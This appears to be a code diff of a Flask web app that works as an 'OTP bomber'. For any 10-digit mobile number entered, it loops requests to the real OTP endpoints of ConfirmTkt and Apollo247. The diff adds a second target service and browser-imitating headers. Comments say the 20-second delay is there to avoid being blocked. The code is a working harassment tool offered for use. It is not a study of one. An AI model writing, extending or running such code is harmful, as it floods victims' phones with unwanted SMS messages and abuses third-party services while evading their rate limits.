@@ -6,50 +6,48 @@ from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
 
-# OTP Sending Logic
-API_URL = "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={}"
-DELAY = 20 # Delay thoda badha diya hai taaki block na ho
-
 active_tasks = {}
 
-def send_otp_loop(mobile):
+def send_bomber(mobile):
     count = 1
-    # Improved Headers (Browser jaisa dikhne ke liye)
-    headers = {
-        "Accept": "*/*",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-        "Connection": "keep-alive",
-        "Host": "securedapi.confirmtkt.com",
-        "Origin": "https://www.confirmtkt.com",
-        "Referer": "https://www.confirmtkt.com/",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-site",
-        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
-    }
-    
-    # Session use karne se cookies manage hoti hain, jo real lagta hai
+    # Sessions manage connections better
     session = requests.Session()
     
+    # Headers ko aur real banaya gaya hai
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+        "Content-Type": "application/json",
+        "Referer": "https://www.confirmtkt.com/",
+        "Origin": "https://www.confirmtkt.com"
+    }
+
     while active_tasks.get(mobile):
+        # --- API 1: ConfirmTkt (POST Method) ---
         try:
-            formatted_url = API_URL.format(mobile)
-            response = session.get(formatted_url, headers=headers, timeout=15)
-            
-            # Log mein status code aur response print hoga
-            print(f"[{mobile}] Attempt #{count} - Status: {response.status_code}")
-            
-            if response.status_code == 200:
-                print(f"SUCCESS: OTP Sent to {mobile}")
-            elif response.status_code == 403:
-                print("FAILED: API ne block kar diya (403 Forbidden).")
-            
+            payload = {"mobileNumber": mobile}
+            res1 = session.post(
+                "https://securedapi.confirmtkt.com/api/platform/register", 
+                json=payload, 
+                headers=headers, 
+                timeout=10
+            )
+            print(f"[{mobile}] API 1 Status: {res1.status_code} - Count: {count}")
         except Exception as e:
-            print(f"Error: {e}")
-        
+            print(f"API 1 Error: {e}")
+
+        # --- API 2: Apollo (Backup) ---
+        try:
+            res2 = session.get(
+                f"https://m.apollo247.com/api/v2/otp/generate?mobile={mobile}", 
+                headers=headers, 
+                timeout=10
+            )
+            print(f"[{mobile}] API 2 Status: {res2.status_code}")
+        except Exception as e:
+            print(f"API 2 Error: {e}")
+
         count += 1
-        time.sleep(DELAY)
+        time.sleep(20) # 20 seconds ka gap taaki block na ho
 
 @app.route('/')
 def index():
@@ -59,14 +57,14 @@ def index():
 def start_bomber():
     mobile = request.form.get('mobile')
     if not mobile or len(mobile) != 10:
-        return jsonify({"status": "error", "message": "Invalid 10-digit Number"})
+        return jsonify({"status": "error", "message": "Invalid Number"})
     
     if mobile not in active_tasks or not active_tasks[mobile]:
         active_tasks[mobile] = True
-        thread = threading.Thread(target=send_otp_loop, args=(mobile,))
-        thread.daemon = True
-        thread.start()
-        return jsonify({"status": "success", "message": f"Attack Started on {mobile}"})
+        # Background process start karna
+        t = threading.Thread(target=send_bomber, args=(mobile,))
+        t.start()
+        return jsonify({"status": "success", "message": f"OTP Loop Started for {mobile}"})
     return jsonify({"status": "info", "message": "Already running"})
 
 @app.route('/stop', methods=['POST'])
@@ -76,5 +74,6 @@ def stop_bomber():
     return jsonify({"status": "success", "message": "Stopped"})
 
 if __name__ == "__main__":
+    # Render ke port par run karna
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
